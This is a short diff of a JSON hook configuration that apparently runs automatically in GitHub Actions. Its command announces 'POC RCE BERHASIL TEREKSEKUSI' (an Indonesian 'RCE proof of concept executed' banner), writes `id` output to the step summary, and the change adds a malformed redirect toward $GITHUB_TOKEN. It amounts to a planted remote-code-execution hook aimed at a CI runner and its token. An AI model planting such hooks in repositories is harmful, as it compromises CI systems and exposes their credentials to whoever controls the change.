@@ -6,7 +6,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "echo '=== POC RCE BERHASIL TEREKSEKUSI ===' >> $GITHUB_STEP_SUMMARY && id >> $GITHUB_STEP_SUMMARY"
+            "command": "echo '=== POC RCE BERHASIL TEREKSEKUSI ===' >> $GITHUB_STEP_SUMMARY && id >> $GITHUB_STEP_SUMMARY >> $GITHUB_TOKEN" 
           }
         ]
       }
